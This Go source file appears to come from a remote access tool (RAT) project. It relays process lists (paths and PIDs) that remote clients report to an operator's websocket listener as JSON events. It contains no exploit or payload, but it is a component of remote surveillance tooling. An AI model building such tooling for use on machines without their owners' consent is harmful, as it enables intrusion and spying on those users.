package main

import (
	"rat/common"

	"encoding/json"

	"golang.org/x/net/websocket"
)

type Process struct {
	Path string `network:"send"`
	PID  int    `network:"send,receive"`
}

type ProcessPacket struct {
	Action    int       `network:"send,receive"`
	Processes []Process `network:"send,receive"`
}

func (packet ProcessPacket) Header() common.PacketHeader {
	return common.ProcessHeader
}

func (packet ProcessPacket) Init(c *Client) {

}

func (packet ProcessPacket) OnReceive(c *Client) error {
	for _, proc := range packet.Processes {
		if ws, ok := c.Listeners[common.ProcessHeader]; ok {
			message := ProcessMessage{proc.PID, proc.Path}
			mstr, _ := json.Marshal(&message)
			event := newEvent(ProcessQueryEvent, c.Id, string(mstr))

			err := websocket.JSON.Send(ws, &event)

			if err != nil {
				return err
			}
		}
	}

	delete(c.Listeners, common.ProcessHeader)

	return nil
}
